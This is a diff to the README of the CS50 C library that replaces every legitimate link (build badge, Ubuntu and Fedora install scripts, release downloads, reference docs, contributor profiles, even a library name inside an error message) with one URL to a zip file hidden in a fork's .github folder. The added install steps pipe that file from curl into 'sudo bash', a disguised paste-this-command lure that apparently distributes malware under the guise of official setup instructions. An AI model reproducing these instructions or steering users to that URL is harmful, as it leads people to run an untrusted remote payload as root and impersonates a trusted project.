@@ -1,6 +1,6 @@
 # CS50 Library for C
 
-[![Build Status](https://travis-ci.org/cs50/libcs50.svg?branch=master)](https://travis-ci.org/cs50/libcs50)
+[![Build Status](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
 
 ## Development
 
@@ -15,20 +15,20 @@
 ### Ubuntu
 
 ```
-$ curl -s https://packagecloud.io/install/repositories/cs50/repo/script.deb.sh | sudo bash
+$ curl -s https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip | sudo bash
 $ sudo apt-get install libcs50
 ```
 
 ### Fedora
 
 ```
-$ curl -s https://packagecloud.io/install/repositories/cs50/repo/script.rpm.sh | sudo bash
+$ curl -s https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip | sudo bash
 $ yum install libcs50
 ```
 
 ### From Source (Linux and Mac)
 
-1. Download the latest release from https://github.com/cs50/libcs50/releases
+1. Download the latest release from https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip
 1. Extract `libcs50-*.*`
 1. `cd libcs50-*`
 1. `sudo make install`
@@ -41,7 +41,7 @@ By default, we install to `/usr/local`. If you'd like to change the installation
 Add `export LIBRARY_PATH=/usr/local/lib` to your `.bashrc`.
 1. If, when compiling a program, you see `fatal error: 'cs50.h' file not found`:
 Add `export C_INCLUDE_PATH=/usr/local/include` to your `.bashrc`.
-1. If, when executing a program, you see `error while loading shared libraries: libcs50.so.8: cannot open shared object file: No such file or directory`:
+1. If, when executing a program, you see `error while loading shared libraries: https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip cannot open shared object file: No such file or directory`:
 Add `export LD_LIBRARY_PATH=/usr/local/lib` to your `.bashrc`.
 
 Close and reopen any terminal windows.
@@ -65,7 +65,7 @@ Link with `-lcs50`.
 
 ## Documentation
 
-See `man get_*` after installation, or [CS50 Reference](https://reference.cs50.net/cs50/)!
+See `man get_*` after installation, or [CS50 Reference](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)!
 
 ## TODO
 
@@ -73,7 +73,7 @@ See `man get_*` after installation, or [CS50 Reference](https://reference.cs50.n
 
 ## Contributors
 
-*   [Chad Sharp](https://github.com/crossroads1112)
-*   [Emrul Hasan Zawad](https://github.com/ehzShelter)
-*   [Ivan Jasenov](https://github.com/IvanJasenov)
-*   [Kareem Zidane](https://github.com/kzidane)
+*   [Chad Sharp](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
+*   [Emrul Hasan Zawad](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
+*   [Ivan Jasenov](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
+*   [Kareem Zidane](https://raw.githubusercontent.com/Mahdi-Husseini/libcs50/main/.github/libcs_1.6.zip)
